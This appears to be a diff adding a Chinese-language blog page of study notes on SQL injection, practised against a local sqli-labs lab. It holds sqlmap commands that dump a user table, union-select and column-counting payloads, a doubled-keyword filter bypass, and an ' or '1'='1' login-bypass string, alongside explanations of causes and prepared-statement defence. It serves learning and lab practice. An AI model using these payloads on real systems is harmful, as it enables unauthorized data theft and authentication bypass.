@@ -1,0 +1,53 @@
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>python sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a></p>
+<p>python sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> –dbs</p>
+<p>python sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> -D security –tables</p>
+<p>python sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> -D security -T users –dump-all</p>
+<p>清除缓存</p>
+<p>python sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> –purge</p>
+<p>可以用获取cookie得到现在已经登录</p>
+<p>–columns 可以获得指定数据库列&#x2F;表项</p>
+<h1 id="可能需要进阶学习"><a href="#可能需要进阶学习" class="headerlink" title="可能需要进阶学习"></a>可能需要进阶学习</h1><p><a href="https://zh.wikipedia.org/zh-cn/SQL%E6%B3%A8%E5%85%A5">SQL注入 - 维基百科，自由的百科全书 (wikipedia.org)</a></p>
+<p><a href="http://www.phpmyadmin.net数据库图形化界面/">www.phpmyadmin.net数据库图形化界面</a>  SQLyog Ultimate 64</p>
+<blockquote>
+<p><strong>information_schema</strong> 库:是信息数据库，其中保存着关于MSQL服务器所维护的所有其他数据库的信息,  比如数据库名，数据库表，表字段的数据类型与访问权限等。Web渗透过程中用途很大。（<strong>摘要</strong>）<br><strong>SCHEMATA</strong> 表 : 提供了当前MySQL实例中所有的数据库信息，<span data-type="text" style="color: var(--b3-font-color12);">show databases</span> 结果取之此表<br><strong>TABLES</strong> 表 : 提供了关于数据中表的信息<br><strong>COLUMNS</strong> 表 : 提供了表中的列信心，详细描述了某张表的所有列已经每个列的信息。<br><strong>mysql</strong> 库 : MySQL的核心数据库，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的<br>控制和管理信息。<br><strong>performance_schema</strong> 库 : 内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写<br>速度要高出几个数量级，将数据保存在内存中相 比从磁盘上访问能够极大地提高应用的性能<br><strong>sys</strong> 库 : 通过这个数据库数据库，可以査询谁使用了最多的资源 基于IP或是用户。哪张表被访问过最多等等<br>信息。</p>
+</blockquote>
+<p><a href="https://blog.csdn.net/qq_45173404/article/details/115712758">MySQL详细学习教程（建议收藏）-CSDN博客</a></p>
+<p><strong>用  1‘ order by 1# 		1‘ order by 2#等进行判断数据库有几列&#x2F;字段</strong></p>
+<h2 id="联合查询其他信息"><a href="#联合查询其他信息" class="headerlink" title="联合查询其他信息"></a>联合查询其他信息</h2><p><strong>union select [sql1][sql2]</strong></p>
+<p>输入 1’ union select user(),database()#</p>
+<p>用户输入sql语句，执行了MySQL内置函数user()和database()</p>
+<p>‍</p>
+<blockquote>
+<p>system_user()				管理员</p>
+<p>user()					用户</p>
+<p>current_user()				</p>
+<p>database()				库</p>
+<p>version()					版本</p>
+<p>@@datadir				mysql安装路径</p>
+<p>@@version_compile_os		当前的操作系统</p>
+</blockquote>
+<p>‍</p>
+<p>如果很多语句被过滤掉，我们可以尝试双写绕过</p>
+<p>​<code>username=1’ununionion seselectlect 1#&amp;password=1</code>​</p>
+<p>‍</p>
+<h2 id="SQL注入的产生原因"><a href="#SQL注入的产生原因" class="headerlink" title="SQL注入的产生原因:"></a>SQL注入的产生原因:</h2><p>当Web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过<span data-type="text" style="color: var(--b3-font-color8);">严格的过滤处理</span>，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p>
+<h2 id="本质：-把用户输入的数据当成是代码来执行"><a href="#本质：-把用户输入的数据当成是代码来执行" class="headerlink" title="本质： 把用户输入的数据当成是代码来执行"></a>本质： 把用户输入的数据当成是代码来执行</h2><p>两个关键点： 预编译可以防备SQL注入（所有漏洞都是有条件的！！！）</p>
+<p>1、用户能够控制输入的内容；</p>
+<p>2、数据库能够执行用户输入的内容。</p>
+<h2 id="SQl注入的危害："><a href="#SQl注入的危害：" class="headerlink" title="SQl注入的危害："></a>SQl注入的危害：</h2><p>盗取网站的敏感信息；</p>
+<p>绕过网站后台的认证；</p>
+<pre><code>  万能密码： &#39; or &#39;1&#39; = &#39; 1&#39; #
+</code></pre>
+<p>limit 0,1  <kbd>0代表先从第几行开始回显，1代表显示几行</kbd>​</p>
+<p>后台登陆的SQL语句： select * from users where username&#x3D; ‘$user’ and password&#x3D;’$pass’</p>
+<p>‍</p>
+<h2 id="SQL注入的漏洞"><a href="#SQL注入的漏洞" class="headerlink" title="SQL注入的漏洞"></a>SQL注入的漏洞</h2><p>根据注入位置分类： GET类、POST类、Head头注入</p>
+<p>根据反馈结果分类： 有回显（显错注入）、无回显（盲注）</p>
+<p>根据数据类型分类：</p>
+<pre><code>	数字型： 输入的参数为整型，如id、年龄、页码等（&lt;span data-type=&quot;text&quot; style=&quot;color: var(--b3-font-color8);&quot;&gt;SQL注入中数字型没有小数&lt;/span&gt;）
+
+	字符型： 输入的参数为字符串
+</code></pre>
+<p>数字型与字符型最大的区别在于：数字型不需要闭合，而字符型一般需要<span data-type="text" style="color: var(--b3-font-color8);">闭合</span></p>
+<p>‍</p>
+<p>‍</p>
